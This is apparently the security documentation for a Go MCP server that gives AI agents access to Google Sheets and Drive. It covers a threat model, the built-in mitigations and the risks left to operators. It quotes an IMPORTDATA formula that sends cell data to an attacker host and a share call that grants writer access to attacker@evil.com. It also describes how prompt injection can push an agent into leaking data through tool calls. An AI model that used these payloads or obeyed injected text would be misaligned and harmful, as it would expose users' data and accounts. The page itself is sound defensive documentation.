# Security model

## Summary

This page documents the threats the server defends against, the fixes baked in, and the hardening that operators must still perform. Several mitigations are direct responses to vulnerabilities identified in the upstream Python project.

## Threat model

| Adversary | Capability | Goal |
| --- | --- | --- |
| Prompt-injection attacker | Plants text into a spreadsheet or document the agent reads. | Coerce the agent into calling MCP tools to exfiltrate data or grant access. |
| Network attacker | Reaches the SSE endpoint (e.g. unauthenticated port `8000`). | Issue arbitrary tool calls against the bundled credentials. |
| Co-tenant on the host | Reads files in the running process's directory or `/proc`. | Steal the OAuth refresh token or service-account key. |
| Supply-chain attacker | Compromises a build-time dependency. | Inject code into the binary. |

## Mitigations baked into the server

### Drive query-language injection

**Risk:** The Drive `q=` parameter is a string DSL with single-quoted literals. If user-supplied strings are interpolated unescaped, an attacker who can influence the `query`, `folder_id`, or `parent_folder_id` arguments can break out of the literal and broaden the search across the entire Drive scope the principal can see.

**Mitigation:** All Drive query interpolations route through `escapeDriveQuery`, which escapes `'` and `\` per the Drive query syntax rules.

**Where:** [`helpers.go`](../helpers.go) `escapeDriveQuery`; applied in `list_spreadsheets`, `list_folders`, `search_spreadsheets`.

**Tests:** `TestEscapeDriveQuery` in [`helpers_test.go`](../helpers_test.go).

### Sheets formula injection

**Risk:** When the Sheets API is called with `valueInputOption=USER_ENTERED`, strings beginning with `=` are parsed as formulas. Formulas like `=IMPORTDATA("https://attacker/?d="&A1)` exfiltrate data via Google's servers when the sheet is later opened.

**Mitigation:** `update_cells` and `batch_update_cells` default `value_input_option` to `RAW`. Callers must explicitly pass `USER_ENTERED` to opt into formula evaluation.

**Where:** [`tools.go`](../tools.go) `chooseValueInputOption`.

**Tests:** `TestChooseValueInputOption` in [`helpers_test.go`](../helpers_test.go).

### SSE transport binds localhost by default

**Risk:** A previous version of the Python project bound the SSE transport to `0.0.0.0`. Combined with the documented Docker recipe (`docker run -p 8000:8000`), this exposed an unauthenticated MCP endpoint to the network — any peer who reached port `8000` got full use of the bundled Google credentials.

**Mitigation:** The Go server defaults `HOST` to `127.0.0.1`. Operators must consciously set `HOST=0.0.0.0` and add their own authentication front-end (reverse proxy with auth, mTLS, etc.).

**Where:** [`main.go`](../main.go), SSE transport branch.

### OAuth token file permissions

**Risk:** On a multi-user host, an OAuth refresh token written with default umask (`0644`) is readable by other users on the system. The refresh token grants long-lived access to the user's Google account at the requested scopes.

**Mitigation:** `saveToken` opens the file with mode `0600`.

**Where:** [`auth.go`](../auth.go) `saveToken`.

### share_spreadsheet allow-list

**Risk:** `share_spreadsheet` grants read/comment/write permission to arbitrary emails. A prompt-injection attacker who can influence the agent's tool calls can grant themselves access via `{"email_address":"attacker@evil.com", "role":"writer"}`.

**Mitigation:** If `ALLOWED_SHARE_DOMAINS` is set, recipients whose domain is not on the allow-list are rejected server-side. The variable is unset by default — operators must opt in.

**Recommended setting:** Set `ALLOWED_SHARE_DOMAINS` to your organisation's domains in production deployments.

**Where:** [`tools.go`](../tools.go) `parseAllowedDomains`, `domainAllowed`.

**Tests:** `TestDomainAllowed` in [`helpers_test.go`](../helpers_test.go).

### Container hardening

The Dockerfile produces a distroless image and runs the binary as `nonroot:nonroot`. There is no shell, no package manager, and no writable filesystem aside from `/tmp`.

**Where:** [`Dockerfile`](../Dockerfile).

## Residual risks operators must address

### MCP has no built-in authentication

Stdio is delivered through a parent process; the parent process boundary is the only authentication. SSE has no authentication at all — operators must put it behind a reverse proxy that enforces auth (bearer tokens, OIDC, mTLS).

### Prompt injection is a tool-design problem, not a server problem

Even with `ALLOWED_SHARE_DOMAINS` and `RAW` value input, an agent acting on attacker-controlled content can still:

- Leak data into a different spreadsheet via `update_cells` (the agent is allowed to write where the credentials can write).
- Copy a sheet into a publicly-shared spreadsheet via `copy_sheet`.
- Use `batch_update` for almost any structural operation.

If the agent reads untrusted content, restrict tool surface using `--include-tools` to the minimum the workflow requires. See [configuration.md](configuration.md#tool-filtering).

### Credentials in environment variables

`CREDENTIALS_CONFIG` exposes the secret in `/proc/<pid>/environ`, container introspection, and any logs that dump the environment. Prefer mounted files (`SERVICE_ACCOUNT_PATH`) where the deployment platform allows.

### API rate and quota

The server does not enforce rate limits. A misbehaving agent (or attacker) can drain Google API quota. Apply quota policies on the Google Cloud project.

## Reporting issues

If you find a security issue, do not file a public GitHub issue. Email the maintainer privately and request a coordinated disclosure window.
